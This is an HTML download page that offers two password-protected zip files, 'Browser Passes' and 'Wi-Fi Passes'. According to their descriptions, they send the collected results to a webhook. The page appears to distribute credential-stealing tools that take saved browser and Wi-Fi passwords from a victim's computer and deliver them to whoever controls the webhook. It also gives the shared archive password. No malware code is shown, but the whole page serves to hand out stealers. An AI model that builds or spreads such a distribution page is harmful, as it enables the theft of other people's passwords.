<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Page</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 800px;
            margin: 50px auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th, td {
            border: 1px solid #303030;
            padding: 15px;
            text-align: left;
        }

        th {
            background-color: #282828;
            color: #61dafb;
            font-weight: bold;
            text-transform: uppercase;
        }

        tr:nth-child(even) {
            background-color: #1f1f1f;
        }

        a {
            color: #61dafb;
            text-decoration: none;
            font-weight: bold;
        }

        a:hover {
            text-decoration: underline;
        }

        /* Additional styles for the new section */
        .password-section {
            text-align: center;
            margin-top: 30px;
        }

        .password-info {
            color: #61dafb;
            font-size: 18px;
        }
    </style>
</head>

<body>

<button onclick="goBack()">Go Back</button>

<script>
    function goBack() {
        window.history.back();
    }
</script>

<div class="container">
    <h1>File Downloads</h1>
    <table>
        <tr>
            <th>File Name</th>
            <th>Description</th>
        </tr>
        <tr>
            <td><a href="./file_downloads/BrowserPasses.zip" download>Browser Passes</a></td>
            <td>Results are sent to PC Info section of webhook.</td>
        </tr>
        <tr>
            <td><a href="./file_downloads/WiFiPasses.zip" download>WiFi Passes</a></td>
            <td>Results are sent to PC Info section of webhook.</td>
        </tr>
        <!-- Add more rows for additional files -->
    </table>

    <!-- New section below the table -->
    <div class="password-section">
        <p class="password-info">Note: All zipped file passwords are set to <strong>123456</strong>.</p>
    </div>
</div>
</body>

</html>
